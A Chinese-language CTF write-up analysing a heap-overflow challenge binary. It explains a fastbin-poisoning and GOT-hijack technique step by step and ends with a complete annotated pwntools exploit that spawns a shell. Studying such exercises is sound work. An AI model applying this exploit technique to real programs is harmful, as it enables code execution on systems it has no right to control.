# 漏洞利用文档

## 执行环境
基于反编译代码和exp分析，程序的执行环境如下：
- **二进制类型**：64位ELF程序，使用x86-64架构，动态链接libc。
- **保护机制**：
  - 栈保护（Canary）：存在，通过`__readfsqword(0x28u)`实现栈溢出检测。
  - 地址空间布局随机化（ASLR）：可能启用（依赖系统设置），但程序本身未启用PIE（位置无关可执行），代码段和數據段地址固定（如`magic`位于`0x6020c0`，`heaparray`位于`0x6020e0`）。
  - 不可执行堆栈（NX）：推断启用，堆栈不可执行，exp通过GOT劫持实现代码执行。
  - 其他：部分RELRO（重定位只读），GOT表可写，允许覆盖函数指针。
- **依赖需求**：依赖libc（如`malloc`、`free`、`system`等函数），exp中使用`elf.libc`自动获取libc基址。运行需确保二进制文件路径正确（`./data/sample17`），并安装pwntools等调试工具。
- **运行环境**：Linux系统，需有`/bin/sh`和`cat`命令用于获取flag（`/home/pwn/flag`）。

## 漏洞成因
- **关键结构体**：程序使用全局数组`heaparray`（位于`0x6020e0`）存储10个堆块指针，每个指针指向malloc分配的堆块用户数据区。堆块结构包括元数据（size和fd指针）和用户数据。
- **漏洞分析**：
  - **漏洞类型**：堆溢出（Heap Overflow），由`edit_heap`函数中的大小检查缺失导致。
  - **根本原因**：在`edit_heap`函数中，用户可指定写入大小（`v2`），但未验证该大小是否小于或等于堆块的原始分配大小。反编译代码显示：`read_input(*(&heaparray + v1), v2)`直接使用用户输入的`v2`作为读取长度，允许写入超过堆块边界的数据。
  - **触发条件**：通过编辑堆块时提供超大的`v2`，可溢出到相邻堆块，修改其元数据（如fd指针）或用户数据。结合`delete_heap`的释放操作和`create_heap`的分配操作，可导致Use-After-Free（UAF）或fastbin攻击。
- **动态调试验证**：调试记录显示，Step 3中通过编辑堆块1（索引1）并指定大小超过0x68，成功覆盖了堆块2的fd指针，将fastbin链污染为指向bss段（`0x6020ad`），证实了堆溢出漏洞的存在。

## 漏洞利用过程
利用过程通过堆溢出污染fastbin链，实现任意地址写入，最终劫持GOT表执行system("/bin/sh")。以下是基于exp步进调试的内存变化总结（以表格形式描述）：

| 步骤 | EXP操作 | 堆内存变化 | fastbin链状态 | 全局变量/关键地址变化 | 利用目的 |
|------|---------|------------|---------------|---------------------|----------|
| 1 | `add(0x68,b'6')` x3 | 分配堆块0、1、2；用户数据均为"6"；元数据size=0x71 | fastbin空 | `heaparray[0..2]`指向堆块用户数据区；`magic=0x0` | 初始化堆布局，创建连续堆块用于溢出 |
| 2 | `free(2)` | 释放堆块2；其fd指针初始为0x0 | fastbin 0x70链：`堆块2 → 0x0` | `heaparray[2]`置零 | 将堆块2加入fastbin，为溢出篡改做准备 |
| 3 | `edit(1, payload)` | 堆块1用户数据被覆盖为`/bin/sh\x00` + 填充0x60字节 + 伪造元数据（size=0x71, fd=0x6020ad）；溢出覆盖堆块2的fd指针 | fastbin 0x70链：`堆块2 → 0x6020ad` | 无变化 | 通过堆溢出篡改堆块2的fd指针，指向bss段（伪造chunk），污染fastbin链 |
| 4 | `add(0x68,b'6')` x2 | 第一次分配返回堆块2；第二次分配返回伪造chunk（地址~0x6020ad） | fastbin链清空 | `heaparray[2]`重新指向堆块2；`heaparray[3]`指向伪造地址 | 通过malloc获取伪造chunk，获得任意地址写入能力 |
| 5 | `edit(3, payload)` | 在伪造chunk写入0x23字节填充 + `p64(elf.got['free'])` | 无直接影响 | 目标地址（bss段）被写入free的GOT地址 | 将free的GOT地址写入可控位置，为GOT覆盖做准备 |
| 6 | `edit(0, payload)` | 堆块0用户数据被覆盖为`p64(elf.plt['system'])` | 无变化 | `free@got`被覆盖为`system@plt` | 劫持GOT表，使free调用实际执行system |
| 7 | `free(1)` | 释放堆块1；因GOT被劫持，实际执行`system("/bin/sh")` | 堆块1加入fastbin | 无变化 | 触发控制流劫持，执行system("/bin/sh")获取shell |
| 8 | `ia()` | 进程替换为shell；内存映射重构，原始堆栈被shell进程替换 | 所有bins空 | 进程进入交互模式，可执行任意命令 | 完成利用，获取flag |

**内存变化关键点**：
- **堆溢出**：Step 3中，堆块1的溢出覆盖了堆块2的fd指针，将fastbin链指向bss段地址`0x6020ad`（靠近`magic`和`heaparray`）。
- **任意地址写入**：Step 4-5通过伪造chunk在bss段写入数据，Step 6直接覆盖GOT表。
- **控制流劫持**：Step 7利用GOT劫持将`free`调用转为`system`调用，参数`/bin/sh`来自堆块1的用户数据。

## Exploit
以下是漏洞利用脚本（exp），在关键位置添加注释解释利用逻辑：

```python
from pwn import *

# 设置调试环境和上下文
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample17')
elf = ELF('./data/sample17')
libc = elf.libc  # 自动获取libc基址

# 定义工具函数简化操作
n2b = lambda x    : str(x).encode()
rv  = lambda x    : p.recv(x)
ru  = lambda s    : p.recvuntil(s)
sd  = lambda s    : p.send(s)
sl  = lambda s    : p.sendline(s)
sn  = lambda n    : sl(n2b(n))
sa  = lambda t, s : p.sendafter(t, s)
sla = lambda t, s : p.sendlineafter(t, s)
sna = lambda t, n : sla(t, n2b(n))
ia  = lambda      : p.interactive()
rop = lambda r    : flat([p64(x) for x in r])

# 定义堆操作函数
def add(size, content):
    sla(':','1')
    sla(':', str(size))
    sla(':', content)

def edit(idx, content):
    sla(':','2')
    sla(':', str(idx))
    sla(':', str(len(content)))  # 关键：这里指定写入大小，可超过原始堆块大小，导致堆溢出
    sla(':', content)

def free(idx):
    sla(':','3')
    sla(':', str(idx))

# 利用开始
# Step 1: 创建3个大小为0x68的堆块，初始化堆布局
add(0x68, b'6')
add(0x68, b'6')
add(0x68, b'6')

# Step 2: 释放堆块2，将其加入fastbin 0x70链
free(2)

# Step 3: 编辑堆块1，通过堆溢出覆盖堆块2的fd指针
#  payload: b'/bin/sh\x00'（为后续system准备参数） + 填充0x60字节 + 伪造元数据（size=0x71, fd=0x6020ad）
#  0x6020ad是bss段地址，靠近heaparray，用于伪造chunk
edit(1, b'/bin/sh\x00' + b'\x00'*0x60 + p64(0x71) + p64(0x6020ad))

# Step 4: 分配两个堆块，第二次分配从污染后的fastbin链获取伪造chunk
add(0x68, b'6')
add(0x68, b'6')  # 这个堆块对应索引3，地址为伪造的0x6020ad附近

# Step 5: 编辑伪造堆块（索引3），在bss段写入free的GOT地址
#  payload: 0x23字节填充 + p64(elf.got['free'])，将free@got地址写入可控位置
edit(3, b'\x00'*0x23 + p64(elf.got['free']))

# Step 6: 编辑堆块0，覆盖free的GOT表项为system的PLT地址
#  通过写入堆块0的数据（实际无边界检查），直接修改GOT
edit(0, p64(elf.plt['system']))

# Step 7: 释放堆块1，由于GOT被劫持，实际调用system("/bin/sh")
free(1)

# Step 8: 进入交互模式，获取shell
ia()
```

**注释说明**：
- **堆溢出点**：`edit`函数中的`str(len(content))`允许指定任意大小，结合`read_input`未检查边界，导致堆溢出。
- **fastbin攻击**：通过溢出修改fd指针，将fastbin链指向bss段，实现任意地址分配。
- **GOT劫持**：覆盖`free@got`为`system@plt`，使`free`调用执行system，参数`/bin/sh`来自堆块1。
- **利用成功**：最终获取shell，可执行`cat /home/pwn/flag`获取flag（依赖`l33t`函数，但exp通过GOT劫持直接调用system，绕过了`magic`检查）。
